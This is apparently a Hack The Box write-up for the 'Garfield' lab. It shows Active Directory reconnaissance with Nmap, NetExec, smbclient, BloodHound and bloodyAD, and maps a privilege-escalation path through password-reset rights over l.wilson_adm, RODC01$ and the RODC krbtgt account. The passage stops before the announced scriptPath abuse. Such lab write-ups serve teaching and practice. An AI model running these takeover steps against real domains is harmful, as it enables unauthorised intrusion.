---
title: Garfield
date: 2026-05-29
excerpt: HackTheBox - Hard
cover: ../uploads/cover_garfield.jpg
tags: RBCD Abuse, Key List Attack, Forging RODC Golden Ticket
---

# HackTheBox Garfield— Writeup

Welcome back to another writeup! In this walkthrough, I'll be covering my approach to solving **Garfield** from Hack The Box. This machine is primarily focused on **Active Directory exploitation**, requiring a combination of enumeration, privilege escalation, and post-exploitation techniques to progress through the environment. Throughout this writeup, I'll break down the methodology I used, explain the reasoning behind each step, and highlight the tools and techniques that proved useful along the way. Rather than simply presenting commands, I'll also discuss the thought process behind the attack path so that readers can better understand how to approach similar Active Directory scenarios in real-world assessments and CTF environments.

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FPHxSLFhK8HSbuNd06lGR%252Fharuhi-suzumiya-anime.gif%3Falt%3Dmedia%26token%3Da4b1d0a0-5497-4c66-ac45-59889a7fb57b&width=768&dpr=3&quality=100&sign=fcf932ed&sv=2)

## Reconnaissance

The assessment began with an **Nmap** scan against the target host to identify exposed services, enumerate open ports, and gather information that could be leveraged during subsequent phases of the engagement.

```shellscript
┌──(kuroshiro㉿a1sberg)-[~/HTB/GArfield]
└─$ nmap -A -T5 10.129.7.99
Starting Nmap 7.95 ( https://nmap.org ) at 2026-07-17 06:38 UTC
Stats: 0:00:39 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 97.85% done; ETC: 06:38 (0:00:00 remaining)
Nmap scan report for 10.129.7.99
Host is up (0.071s latency).
Not shown: 986 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-07-17 14:38:26Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: garfield.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped                                                                                                                                                                                         
2179/tcp open  vmrdp?                                                                                                                                                                                             
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: garfield.htb0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: GARFIELD
|   NetBIOS_Domain_Name: GARFIELD
|   NetBIOS_Computer_Name: DC01
|   DNS_Domain_Name: garfield.htb
|   DNS_Computer_Name: DC01.garfield.htb
|   DNS_Tree_Name: garfield.htb
|   Product_Version: 10.0.17763
|_  System_Time: 2026-07-17T14:38:50+00:00
|_ssl-date: 2026-07-17T14:39:31+00:00; +7h59m55s from scanner time.
| ssl-cert: Subject: commonName=DC01.garfield.htb
| Not valid before: 2026-07-16T13:59:42
|_Not valid after:  2027-01-15T13:59:42
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|10 (97%)
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
Aggressive OS guesses: Windows Server 2019 (97%), Microsoft Windows 10 1903 - 21H1 (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-07-17T14:38:51
|_  start_date: N/A
|_clock-skew: mean: 7h59m54s, deviation: 0s, median: 7h59m54s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

TRACEROUTE (using port 445/tcp)
HOP RTT      ADDRESS
1   72.47 ms 10.10.14.1
2   72.69 ms 10.129.7.99

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 80.96 seconds
```

The Nmap scan identified several services commonly associated with a **Windows Active Directory Domain Controller**, allowing us to establish an initial understanding of the target environment.

The presence of **Kerberos (88/tcp)**, **LDAP (389/tcp)**, **Global Catalog LDAP (3268/tcp)**, and **SMB (445/tcp)** strongly indicates that the target is functioning as a Domain Controller. This assumption is further supported by the LDAP service banner, which reveals the domain name **garfield.htb**, and the RDP information disclosing the hostname **DC01.garfield.htb**.

### Active Directory Services

| Port | Service                      | Significance                                                                                                      |
| ---- | ---------------------------- | ----------------------------------------------------------------------------------------------------------------- |
| 53   | DNS                          | Domain name resolution service used throughout the AD environment.                                                |
| 88   | Kerberos                     | Primary authentication protocol used in Active Directory. Useful for user enumeration and Kerberos-based attacks. |
| 389  | LDAP                         | Directory service containing domain objects such as users, groups, and computers.                                 |
| 464  | Kerberos Password Change     | Supports password management operations.                                                                          |
| 3268 | Global Catalog LDAP          | Provides access to domain-wide directory information.                                                             |
| 3269 | Global Catalog LDAP over SSL | Encrypted version of the Global Catalog service.                                                                  |

The LDAP banner reveals the domain:

```
Domain: garfield.htb
```

This information should be added to the local hosts file to facilitate future interactions with domain services:

```shellscript
echo "10.129.7.99 garfield.htb DC01.garfield.htb DC01" | sudo tee -a /etc/hosts
```

## Enumeration

Unlike a typical external assessment where valid credentials must first be obtained, this machine provides a set of low-privileged domain user credentials from the outset. These credentials can be leveraged to perform authenticated enumeration against the Active Directory environment and potentially uncover privilege escalation opportunities.

```
Username : j.arbuckle
Password : Th1sD4mnC4t!@1978
```

With a valid domain account already available, the next step is to verify access and begin enumerating domain resources, users, groups, shares, and other Active Directory objects that may contribute to the overall attack path.

Using the provided credentials, an authenticated LDAP enumeration was performed to gather information about domain users. The results confirm that the supplied credentials are valid and provide sufficient privileges to query Active Directory objects.

```shellscript
┌──(kuroshiro㉿a1sberg)-[~/HTB/GArfield]
└─$ nxc ldap garfield.htb -u 'j.arbuckle' -p 'Th1sD4mnC4t!@1978' --users
LDAP        10.129.7.99     389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:garfield.htb)
LDAP        10.129.7.99     389    DC01             [+] garfield.htb\j.arbuckle:Th1sD4mnC4t!@1978 
LDAP        10.129.7.99     389    DC01             [*] Enumerated 7 domain users: garfield.htb
LDAP        10.129.7.99     389    DC01             -Username-                    -Last PW Set-       -BadPW-  -Description-
LDAP        10.129.7.99     389    DC01             Administrator                 2025-10-03 17:29:26 0        Built-in account for administering the computer/domain
LDAP        10.129.7.99     389    DC01             Guest                         <never>             0        Built-in account for guest access to the computer/domain
LDAP        10.129.7.99     389    DC01             krbtgt                        2025-08-13 11:05:26 0        Key Distribution Center Service Account
LDAP        10.129.7.99     389    DC01             krbtgt_8245                   2025-08-17 11:33:39 0        Key Distribution Center service account for read-only domain controller
LDAP        10.129.7.99     389    DC01             j.arbuckle                    2025-09-09 15:50:55 0             
LDAP        10.129.7.99     389    DC01             l.wilson                      2026-01-27 21:40:33 0             
LDAP        10.129.7.99     389    DC01             l.wilson_adm                  2026-01-13 14:56:35 2 
```

The enumeration identified a total of **seven domain user accounts**, including several default Active Directory accounts and two user accounts of particular interest:

```
Administrator
Guest
krbtgt
krbtgt_8245
j.arbuckle
l.wilson
l.wilson_adm
```

Several observations can be made from these results:

* The successful LDAP authentication confirms that the provided credentials are valid and can be used for authenticated domain reconnaissance.
* The presence of **l.wilson\_adm** is notable, as the naming convention suggests it may be a privileged or administrative account associated with the standard user account **l.wilson**.
* The **BadPW** value of **2** for **l.wilson\_adm** indicates that two failed authentication attempts have recently been recorded against this account. This may suggest recent administrative activity, password guessing attempts, or another user attempting to access the account.
* Both **Administrator** and **krbtgt** appear to be standard built-in Active Directory accounts and do not immediately provide actionable information.
* The **Last PW Set** timestamps indicate that both **l.wilson** and **l.wilson\_adm** have had their passwords changed more recently than the provided user account, making them attractive candidates for further investigation.

At this stage, the most interesting finding is the existence of the **l.wilson / l.wilson\_adm** account pair. In many Active Directory environments, users are assigned a standard account for daily activities and a separate privileged account for administrative tasks. As a result, subsequent enumeration efforts should focus on identifying the permissions, group memberships, and potential attack paths associated with these accounts.

After identifying valid domain credentials, SMB enumeration was performed using the **spider\_plus** module to discover accessible network shares and identify files that may contain useful information for further exploitation.

```shellscript
┌──(kuroshiro㉿a1sberg)-[~/HTB/GArfield]
└─$ nxc smb garfield.htb -u 'j.arbuckle' -p 'Th1sD4mnC4t!@1978' -M spider_plus
SMB         10.129.7.99     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:garfield.htb) (signing:True) (SMBv1:False)
SMB         10.129.7.99     445    DC01             [+] garfield.htb\j.arbuckle:Th1sD4mnC4t!@1978 
SPIDER_PLUS 10.129.7.99     445    DC01             [*] Started module spidering_plus with the following options:
SPIDER_PLUS 10.129.7.99     445    DC01             [*]  DOWNLOAD_FLAG: False
SPIDER_PLUS 10.129.7.99     445    DC01             [*]     STATS_FLAG: True
SPIDER_PLUS 10.129.7.99     445    DC01             [*] EXCLUDE_FILTER: ['print$', 'ipc$']
SPIDER_PLUS 10.129.7.99     445    DC01             [*]   EXCLUDE_EXTS: ['ico', 'lnk']
SPIDER_PLUS 10.129.7.99     445    DC01             [*]  MAX_FILE_SIZE: 50 KB
SPIDER_PLUS 10.129.7.99     445    DC01             [*]  OUTPUT_FOLDER: /home/kuroshiro/.nxc/modules/nxc_spider_plus
SMB         10.129.7.99     445    DC01             [*] Enumerated shares
SMB         10.129.7.99     445    DC01             Share           Permissions     Remark                          
SMB         10.129.7.99     445    DC01             -----           -----------     ------                          
SMB         10.129.7.99     445    DC01             ADMIN$                          Remote Admin                    
SMB         10.129.7.99     445    DC01             C$                              Default share                   
SMB         10.129.7.99     445    DC01             IPC$            READ            Remote IPC                      
SMB         10.129.7.99     445    DC01             NETLOGON        READ            Logon server share              
SMB         10.129.7.99     445    DC01             SYSVOL          READ            Logon server share              
SPIDER_PLUS 10.129.7.99     445    DC01             [+] Saved share-file metadata to "/home/kuroshiro/.nxc/modules/nxc_spider_plus/10.129.7.99.json".
SPIDER_PLUS 10.129.7.99     445    DC01             [*] SMB Shares:           5 (ADMIN$, C$, IPC$, NETLOGON, SYSVOL)
SPIDER_PLUS 10.129.7.99     445    DC01             [*] SMB Readable Shares:  3 (IPC$, NETLOGON, SYSVOL)            
SPIDER_PLUS 10.129.7.99     445    DC01             [*] SMB Filtered Shares:  1                                     
SPIDER_PLUS 10.129.7.99     445    DC01             [*] Total folders found:  20                                                                                        
SPIDER_PLUS 10.129.7.99     445    DC01             [*] Total files found:    8
SPIDER_PLUS 10.129.7.99     445    DC01             [*] File size average:    1.08 KB
SPIDER_PLUS 10.129.7.99     445    DC01             [*] File size min:        22 B
SPIDER_PLUS 10.129.7.99     445    DC01             [*] File size max:        3.81 KB
```

The results confirm that authentication was successful and that the user account possesses read access to several SMB shares hosted on the Domain Controller.

| **Share** | **Access** | **Description**                                                    |
| --------- | ---------- | ------------------------------------------------------------------ |
| ADMIN$    | No Access  | Administrative share used for remote administration                |
| C$        | No Access  | Default administrative filesystem share                            |
| IPC$      | READ       | Inter-process communication share                                  |
| NETLOGON  | READ       | Stores logon scripts and domain-related resources                  |
| SYSVOL    | READ       | Contains Group Policy Objects (GPOs) and domain configuration data |

The enumeration revealed that the current user does **not** have access to the administrative shares (**ADMIN$** and **C$**), which is consistent with the privileges expected from a standard domain user. However, read access to **NETLOGON** and **SYSVOL** is significant, as these shares are commonly used during Active Directory assessments to identify login scripts, Group Policy Preferences, deployment artifacts, and other files that may expose credentials or sensitive configuration data.

The spidering module successfully crawled the accessible shares and produced the following statistics:

```
Readable Shares : 3
Folders Found   : 20
Files Found     : 8
```

The relatively small number of files suggests that the environment is either intentionally minimal or that only a limited amount of data is exposed to the current user. Nevertheless, every discovered file should be reviewed carefully, as even a single script, policy file, or configuration artifact can reveal valuable information about the domain.

The SMB service is configured with:

```
SMB Signing : Enabled and Required
SMBv1       : Disabled
```

These settings reflect a reasonably hardened configuration. Mandatory SMB signing helps mitigate relay-based attacks, while the absence of SMBv1 eliminates several legacy attack vectors commonly associated with older Windows environments.

Following the SMB enumeration phase, the metadata collected by the **spider\_plus** module was reviewed to identify files that may warrant further investigation.

```shellscript
┌──(kuroshiro㉿a1sberg)-[~/HTB/GArfield]
└─$ cat /home/kuroshiro/.nxc/modules/nxc_spider_plus/10.129.7.99.json
{
    "NETLOGON": {
        "printerDetect.bat": {
            "atime_epoch": "2025-09-12 22:20:28",
            "ctime_epoch": "2025-09-12 22:20:17",
            "mtime_epoch": "2025-09-12 22:25:38",
            "size": "217 B"
        }
    },
    "SYSVOL": {
        "garfield.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/GPT.INI": {
            "atime_epoch": "2025-09-09 15:55:03",
            "ctime_epoch": "2025-08-13 11:04:48",
            "mtime_epoch": "2025-09-09 15:55:03",
            "size": "22 B"
        },
        "garfield.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf": {
            "atime_epoch": "2025-09-09 15:55:03",
            "ctime_epoch": "2025-08-13 11:04:48",
            "mtime_epoch": "2025-09-09 15:55:03",
            "size": "1.07 KB"
        },
        "garfield.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Registry.pol": {
            "atime_epoch": "2025-08-13 11:11:08",
            "ctime_epoch": "2025-08-13 11:11:08",
            "mtime_epoch": "2025-08-13 11:11:08",
            "size": "2.73 KB"
        },
        "garfield.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/GPT.INI": {
            "atime_epoch": "2026-02-14 01:14:50",
            "ctime_epoch": "2025-08-13 11:04:48",
            "mtime_epoch": "2026-02-14 01:14:50",
            "size": "23 B"
        },
        "garfield.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Microsoft/Windows NT/Audit/audit.csv": {
            "atime_epoch": "2025-09-09 16:44:34",
            "ctime_epoch": "2025-09-09 16:44:17",
            "mtime_epoch": "2025-09-09 16:44:34",
            "size": "535 B"
        },
        "garfield.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf": {
            "atime_epoch": "2026-02-14 01:14:50",
            "ctime_epoch": "2025-08-13 11:04:48",
            "mtime_epoch": "2026-02-14 01:14:50",
            "size": "3.81 KB"
        },
        "garfield.htb/scripts/printerDetect.bat": {
            "atime_epoch": "2025-09-12 22:20:28",
            "ctime_epoch": "2025-09-12 22:20:17",
            "mtime_epoch": "2025-09-12 22:25:38",
            "size": "217 B"
        }
    }
}

```

The results revealed a relatively small number of files within the accessible **NETLOGON** and **SYSVOL** shares. Most of the discovered files are standard Active Directory and Group Policy artifacts, including:

* `GPT.INI`
* `GptTmpl.inf`
* `Registry.pol`
* `audit.csv`

These files are commonly found within domain environments and typically contain policy, auditing, and security configuration settings. While they may occasionally expose useful information, they do not immediately stand out as likely sources of credentials or privileged access.

One file, however, appears significantly more interesting:

```
NETLOGON/printerDetect.bat
SYSVOL/scripts/printerDetect.bat
```

Unlike the standard Group Policy files, `printerDetect.bat` is a custom batch script that appears to have been deployed within the domain. The fact that it exists in both **NETLOGON** and the **SYSVOL scripts** directory suggests that it may be executed automatically by users or systems through a logon script, startup script, or Group Policy configuration.

At this stage, `printerDetect.bat` represents the most promising enumeration lead identified thus far. Consequently, the next step is to retrieve and inspect the contents of the script to determine its purpose and assess whether it exposes sensitive information that could facilitate further access within the domain.

To further investigate the custom script identified during SMB enumeration, the **NETLOGON** share was accessed directly and the file was retrieved for analysis.

```shellscript
┌──(kuroshiro㉿a1sberg)-[~/HTB/GArfield]
└─$ smbclient //garfield.htb/NETLOGON -U 'j.arbuckle%Th1sD4mnC4t!@1978'
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Tue Jan 27 22:13:47 2026                
  ..                                  D        0  Tue Jan 27 22:13:47 2026                
  printerDetect.bat                   A      217  Fri Sep 12 22:20:29 2025                
                                                                                          
                9250815 blocks of size 4096. 989593 blocks available                      
smb: \> get printerDetect.bat
getting file \printerDetect.bat of size 217 as printerDetect.bat (0.6 KiloBytes/sec) (average 0.6 KiloBytes/sec)
```

The contents of the script are shown below:

```bat
@echo off
echo Detecting installed printers...
echo ==============================

wmic printer get Name,DeviceID,PortName,DriverName,Shared,Status /format:table

echo.
echo Printer detection completed.
pause
```

Upon inspection, the script appears to be a simple administrative utility used to enumerate printer-related information on a Windows system. Specifically, it leverages the `wmic printer` command to display details such as:

* Printer names
* Device identifiers
* Port assignments
* Driver information
* Sharing status
* Operational status

No hardcoded credentials, network paths, sensitive configuration data, or other immediately exploitable information were identified within the script.

While custom scripts located in **NETLOGON** or **SYSVOL** often warrant close examination due to the potential for credential exposure or privileged execution, this particular script appears to serve a purely administrative purpose. As a result, it does not provide a direct avenue for privilege escalation or lateral movement.

Having exhausted the initial SMB enumeration avenues, the next step was to perform a comprehensive Active Directory assessment using **BloodHound**. BloodHound is particularly valuable in AD environments as it maps relationships between users, groups, computers, and permissions, often revealing privilege escalation and lateral movement paths that may not be immediately apparent through manual enumeration.

Using the provided domain credentials, a full collection was initiated against the domain controller:

```shellscript
┌──(kuroshiro㉿a1sberg)-[~/HTB/GArfield]
└─$ bloodhound-ce-python -dc 'DC01.garfield.htb' -d 'garfield.htb' -u 'j.arbuckle' -p 'Th1sD4mnC4t!@1978' -ns 10.129.7.99 --zip -c All
INFO: BloodHound.py for BloodHound Community Edition
INFO: Found AD domain: garfield.htb
INFO: Getting TGT for user
INFO: Connecting to LDAP server: DC01.garfield.htb
INFO: Testing resolved hostname connectivity dead:beef::78
INFO: Trying LDAP connection to dead:beef::78
INFO: Testing resolved hostname connectivity dead:beef::f565:6880:35fe:64be
INFO: Trying LDAP connection to dead:beef::f565:6880:35fe:64be
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 2 computers
INFO: Connecting to LDAP server: DC01.garfield.htb
INFO: Testing resolved hostname connectivity dead:beef::78
INFO: Trying LDAP connection to dead:beef::78
INFO: Testing resolved hostname connectivity dead:beef::f565:6880:35fe:64be
INFO: Trying LDAP connection to dead:beef::f565:6880:35fe:64be
INFO: Found 8 users
INFO: Found 55 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: RODC01.garfield.htb
INFO: Querying computer: DC01.garfield.htb
INFO: Done in 00M 27S
INFO: Compressing output into 20260717064612_bloodhound.zip
```

The collection completed successfully, confirming that the low-privileged account possessed sufficient permissions to enumerate a significant portion of the Active Directory environment.

### Enumeration Results

The BloodHound collection identified the following domain objects:

| **Object Type** | **Count** |
| --------------- | --------- |
| Domains         | 1         |
| Computers       | 2         |
| Users           | 8         |
| Groups          | 55        |
| GPOs            | 2         |
| OUs             | 1         |
| Containers      | 19        |
| Trusts          | 0         |

Several observations can be made from these results:

* The environment consists of a **single Active Directory domain** with no external trust relationships, suggesting that any privilege escalation path will likely remain confined to the `garfield.htb` domain.
* Only **two computer objects** were discovered:
  * `DC01.garfield.htb`
  * `RODC01.garfield.htb`
* The presence of **RODC01** is particularly noteworthy. The naming convention strongly suggests a **Read-Only Domain Controller (RODC)**, a specialized type of domain controller commonly deployed in branch office environments. RODCs often introduce unique attack paths and delegated administrative permissions that can be abused under certain circumstances.
* A total of **55 groups** were identified despite the relatively small number of users. This may indicate the presence of delegated administrative roles, custom permission assignments, or nested group memberships that warrant further investigation.
* The discovery of **two Group Policy Objects (GPOs)** aligns with the earlier enumeration of SYSVOL contents and may provide additional context when analyzing privilege relationships within BloodHound.

At this stage, the primary objective is no longer to enumerate individual services but to analyze the collected BloodHound data for privilege escalation opportunities. While the initial reconnaissance revealed only a handful of user accounts, BloodHound can uncover hidden relationships between those accounts, groups, and domain objects that are not readily visible through standard LDAP enumeration.

The next phase of the assessment will focus on reviewing the BloodHound graph for attack paths originating from **j.arbuckle**, with particular attention paid to delegated permissions, group memberships, ACL-based abuses, and any relationships involving the **RODC01** host.

After importing the collected data into BloodHound, an interesting relationship was identified involving the **RODC01** computer account and the **krbtgt\_8245** user account.

The graph reveals the following relationship:

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252Fz2hFZd7TH7sSNwZ8qhxY%252FScreenshot%2520%282923%29.png%3Falt%3Dmedia%26token%3Dde4c43cb-edf0-4e22-85cc-8bff4224383a&width=768&dpr=3&quality=100&sign=decc4e73&sv=2)

### Understanding the Relationship

The **ForceChangePassword** edge indicates that the source object possesses the ability to reset the password of the target account without knowing its current password.

In this case:

```
RODC01$  -->  ForceChangePassword  -->  KRBTGT_8245
```

This means that the **RODC01 computer account** has the right to change the password of **krbtgt\_8245**.

At first glance, this may appear unusual. However, this behavior is actually expected in environments utilizing a **Read-Only Domain Controller (RODC)**.

### Why Does This Relationship Exist?

Earlier enumeration revealed the presence of:

```
RODC01.garfield.htb
```

The name strongly suggests that the host is a **Read-Only Domain Controller**.

When an RODC is deployed, Active Directory automatically creates a dedicated account known as:

```
krbtgt_<RID>
```

Examples:

```
krbtgt_8245
krbtgt_1234
krbtgt_5678
```

This account is **not** the normal domain-wide `krbtgt` account.

Instead, it is a special Kerberos account used exclusively by that specific RODC to issue and validate Kerberos tickets locally.

As a result, the RODC must maintain control over its associated `krbtgt_<RID>` account, which explains the **ForceChangePassword** relationship observed in BloodHound.

### Security Implications

By itself, this relationship is **not immediately exploitable** because the attacker does not currently control the **RODC01$** computer account.

However, it highlights a potentially valuable attack path:

1. Compromise **RODC01**.
2. Obtain access to the **RODC01$** machine account credentials.
3. Abuse the **ForceChangePassword** privilege against **krbtgt\_8245**.
4. Leverage control of the RODC Kerberos account to pursue further privilege escalation opportunities.

The key takeaway is that the graph identifies a trust relationship that becomes relevant **only if RODC01 can be compromised**.

During BloodHound analysis, a number of interesting relationships were identified involving the **l.wilson\_adm** account. Unlike the previously enumerated users, this account appears to occupy a privileged position within the Active Directory environment and is connected to multiple administrative paths.

The graph reveals the following relationships:

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FdvVAZWw5BWHubLyDzAEi%252FScreenshot%2520%282925%29.png%3Falt%3Dmedia%26token%3D58a4d2ee-beac-4810-84c0-1745263dede0&width=768&dpr=3&quality=100&sign=3a5a385d&sv=2)

### Direct Control Over RODC01

The first relationship of interest is the **ForceChangePassword** permission assigned against the **RODC01** computer object.

```
l.wilson_adm
        │
        ▼
ForceChangePassword
        │
        ▼
RODC01$
```

This permission allows `l.wilson_adm` to reset the password of the **RODC01** machine account without knowing its current credentials. Since computer accounts are security principals within Active Directory, controlling the machine account password effectively grants control over that account.

In addition, the account also possesses the **WriteAccountRestrictions** permission over the same object:

```
l.wilson_adm
        │
        ▼
WriteAccountRestrictions
        │
        ▼
RODC01$
```

Although this permission is generally less impactful than a password reset right, it further demonstrates that `l.wilson_adm` has been delegated administrative control over the Read-Only Domain Controller.

### Privileged Group Membership

BloodHound also reveals that **l.wilson\_adm** is a member of the **TIER 1** group:

```
l.wilson_adm
        │
        ▼
      TIER 1
```

Further inspection shows that members of **TIER 1** possess an **AddSelf** permission over the **RODC Administrators** group:

```
TIER 1
    │
    ▼
AddSelf
    │
    ▼
RODC Administrators
```

The **AddSelf** edge indicates that members of the source group can add themselves to the target group. As a result, anyone controlling an account within **TIER 1** can elevate their privileges by joining the **RODC Administrators** group.

### Expanding the Attack Path

When these findings are combined with the relationship identified earlier between **RODC01** and **krbtgt\_8245**, a broader privilege escalation chain begins to emerge:

```
l.wilson_adm
        │
        ├─────────────► TIER 1
        │                    │
        │                    ▼
        │              RODC Administrators
        │
        ▼
ForceChangePassword
        │
        ▼
RODC01$
        │
        ▼
ForceChangePassword
        │
        ▼
krbtgt_8245
```

This graph demonstrates that **l.wilson\_adm** sits at the center of multiple privilege relationships involving the Read-Only Domain Controller infrastructure.

### Correlation with Earlier Enumeration

During LDAP enumeration, two accounts immediately stood out:

```
l.wilson
l.wilson_adm
```

The naming convention suggested a separation between a standard user account and a privileged administrative account. BloodHound now validates this assumption by showing that **l.wilson\_adm** has delegated permissions over critical Active Directory objects and privileged group memberships related to the RODC environment.

At this stage, **l.wilson\_adm** emerges as the most valuable target identified thus far. BloodHound has revealed multiple privilege escalation paths originating from this account, including direct control over the **RODC01** machine account and indirect access to the **RODC Administrators** group through membership in **TIER 1**.

Continuing the BloodHound review, another highly significant relationship was identified involving the standard user account **l.wilson** and its administrative counterpart **l.wilson\_adm**.

The graph reveals the following permission:

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FDWNtc9BirFQV7wpJqVAl%252FScreenshot%2520%282926%29.png%3Falt%3Dmedia%26token%3D57363369-cd6a-4257-8cef-a48b2ba4bf7a&width=768&dpr=3&quality=100&sign=83621ed0&sv=2)

The **ForceChangePassword** edge indicates that **l.wilson** has the ability to reset the password of **l.wilson\_adm** without knowing the account's current password.

Unlike permissions involving computer accounts or groups, this relationship directly impacts another user account. As a result, anyone who gains control of **l.wilson** may be able to take over **l.wilson\_adm** simply by assigning a new password to the account.

This is an unusual delegation and immediately stands out as a potential privilege escalation vector.

### Correlation with Previous Findings

Earlier BloodHound analysis established that **l.wilson\_adm** possesses several privileged relationships within the domain:

```
l.wilson_adm
    ├── ForceChangePassword ──► RODC01$
    ├── WriteAccountRestrictions ──► RODC01$
    └── MemberOf ──► TIER 1
                           │
                           ▼
                 RODC Administrators
```

The newly discovered edge effectively places **l.wilson** directly upstream of these privileges.

When combined, the attack path becomes:

```
l.wilson
        │
        ▼
ForceChangePassword
        │
        ▼
l.wilson_adm
        │
        ▼
ForceChangePassword
        │
        ▼
RODC01$
```

This means that compromising **l.wilson** could potentially lead to compromise of **l.wilson\_adm**, which in turn provides access to the privileged paths previously identified within the RODC infrastructure.

### Why This Finding Is Important

During LDAP enumeration, both accounts were discovered:

```
l.wilson
l.wilson_adm
```

Initially, they appeared to represent a typical separation between a standard user account and an administrative account. However, BloodHound now reveals that the standard account retains password reset rights over the administrative account.

From a security perspective, this significantly weakens the separation between the two accounts. If an attacker can obtain access to **l.wilson**, they may be able to directly escalate into **l.wilson\_adm** without needing to recover or crack the administrator's password.

## Initial Foothold: Abusing Writable `scriptPath` to Compromise l.wilson

To identify potential privilege escalation opportunities that may not be immediately visible in BloodHound, additional ACL enumeration was performed using **bloodyAD**. This tool is particularly useful for discovering writable attributes and delegated permissions assigned to the current user.

```shellscript
┌──(kuroshiro㉿a1sberg)-[~/HTB/GArfield]
└─$ bloodyad --host DC01.garfield.htb -u 'j.arbuckle' -p 'Th1sD4mnC4t!@1978' get writable --detail

distinguishedName: CN=Guest,CN=Users,DC=garfield,DC=htb
scriptPath: WRITE

distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=garfield,DC=htb
url: WRITE
wWWHomePage: WRITE

distinguishedName: CN=krbtgt_8245,CN=Users,DC=garfield,DC=htb
scriptPath: WRITE

distinguishedName: CN=Jon Arbuckle,CN=Users,DC=garfield,DC=htb
thumbnailPhoto: WRITE
pager: WRITE
mobile: WRITE
homePhone: WRITE
userSMIMECertificate: WRITE
msDS-ExternalDirectoryObjectId: WRITE
msDS-cloudExtensionAttribute20: WRITE
msDS-cloudExtensionAttribute19: WRITE
msDS-cloudExtensionAttribute18: WRITE
msDS-cloudExtensionAttribute17: WRITE
msDS-cloudExtensionAttribute16: WRITE
msDS-cloudExtensionAttribute15: WRITE
msDS-cloudExtensionAttribute14: WRITE
msDS-cloudExtensionAttribute13: WRITE
msDS-cloudExtensionAttribute12: WRITE
msDS-cloudExtensionAttribute11: WRITE
msDS-cloudExtensionAttribute10: WRITE
msDS-cloudExtensionAttribute9: WRITE
msDS-cloudExtensionAttribute8: WRITE
msDS-cloudExtensionAttribute7: WRITE
msDS-cloudExtensionAttribute6: WRITE
msDS-cloudExtensionAttribute5: WRITE
msDS-cloudExtensionAttribute4: WRITE
msDS-cloudExtensionAttribute3: WRITE
msDS-cloudExtensionAttribute2: WRITE
msDS-cloudExtensionAttribute1: WRITE
msDS-GeoCoordinatesLongitude: WRITE
msDS-GeoCoordinatesLatitude: WRITE
msDS-GeoCoordinatesAltitude: WRITE
msDS-AllowedToActOnBehalfOfOtherIdentity: WRITE
msPKI-CredentialRoamingTokens: WRITE
msDS-FailedInteractiveLogonCountAtLastSuccessfulLogon: WRITE
msDS-FailedInteractiveLogonCount: WRITE
msDS-LastFailedInteractiveLogonTime: WRITE
msDS-LastSuccessfulInteractiveLogonTime: WRITE
msDS-SupportedEncryptionTypes: WRITE
msPKIAccountCredentials: WRITE
msPKIDPAPIMasterKeys: WRITE
msPKIRoamingTimeStamp: WRITE
